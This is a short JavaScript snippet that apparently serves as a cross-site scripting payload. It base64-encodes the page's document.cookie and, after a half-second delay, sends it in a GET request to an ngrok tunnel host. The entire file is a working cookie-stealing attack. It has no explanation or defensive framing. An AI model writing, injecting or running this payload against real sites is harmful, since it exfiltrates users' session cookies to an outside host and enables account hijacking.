var docx = btoa(document.cookie);

function sendHttp()
{
    var xhttp = new XMLHttpRequest();
    xhttp.open("GET","http://2.tcp.ngrok.io:16238/"+docx,true);
    xhttp.send();
}

setTimeout(function(){ sendHttp(); },500);
